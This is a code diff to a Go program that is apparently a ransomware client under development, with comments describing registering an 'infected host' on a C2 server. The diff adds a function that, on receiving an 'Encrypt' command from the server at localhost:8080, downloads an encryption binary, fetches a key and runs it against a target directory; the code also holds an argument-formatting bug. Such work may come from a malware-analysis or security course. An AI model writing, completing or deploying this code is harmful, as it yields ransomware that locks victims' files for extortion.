@@ -57,7 +57,7 @@ func main() {
 		RegisterHost(Enumeration, userString)
 	}
 	//TODO: There should be something here
-
+	os.Exit(1)
 }
 
 //Identifies a new infected host and registers it on the C2
@@ -107,6 +107,7 @@ func KeepAlive(userString string) error {
 	client := &http.Client{
 		Timeout: time.Second * 10,
 	}
+
 	req, err := http.NewRequest(http.MethodGet, "http://localhost:8080/commands", nil)
 	if err != nil {
 		return fmt.Errorf("error making KeepAlive connection: %s", err.Error())
@@ -125,10 +126,8 @@ func KeepAlive(userString string) error {
 
 	command := string(bytes)
 	if command == "Encrypt" {
-		DownloadFile("./", "http://localhost:8080/filecrypt") //TODO: change directory to /tmp
-		if err != nil {
-			panic(err)
-		}
+		Encryption(userString)
+
 	} else {
 		time.Sleep(time.Minute * 10)
 		KeepAlive(userString)
@@ -208,12 +207,44 @@ func Enumerate() (Discovery Enumeration, userString string) {
 }
 
 //trigger key creation serverside and download the encryption binary from /file
-func Download() {
-	//placeholder code
+func Encryption(userString string) error {
 
-	fmt.Println("I would start encrypting")
+	err := DownloadFile("./", "http://localhost:8080/resources/filecrypt") //TODO: change directory to /tmp
+	if err != nil {
+		panic(err)
+	}
+
+	client := &http.Client{
+		Timeout: time.Second * 10,
+	}
+
+	req, err := http.NewRequest(http.MethodGet, "http://localhost:8080/encrypt", nil)
+	if err != nil {
+		return fmt.Errorf("error making KeepAlive connection: %s", err.Error())
+	}
+	req.Header.Add("ID", userString)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("error making KeepAlive connection: %s", err.Error())
+	}
+
+	bytes, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return fmt.Errorf("error reading KeepAlive response: %s", err.Error())
+	}
+
+	key := string(bytes)
+
+	//run th encrypter
+
+	cmd := exec.Command("./crypt", "--mode=e --password=\"%s\" --location=./test", key)
+	if err := cmd.Run(); err != nil {
+		panic(err)
+	}
+	fmt.Println("I have encrypted the files")
 	time.Sleep(time.Second * 10)
-	os.Exit(1)
+	return nil
 }
 
 func DownloadFile(filepath string, url string) error {
@@ -234,9 +265,8 @@ func DownloadFile(filepath string, url string) error {
 
 	// Write the body to file
 	_, err = io.Copy(out, resp.Body)
-	fmt.Println("Encrypt run successfully")
-	time.Sleep(time.Second * 10)
-	os.Exit(1)
+	fmt.Println("Successfully downloaded file")
+	return nil
 
 	//runs the encrypter
 	//TODO: program this logic
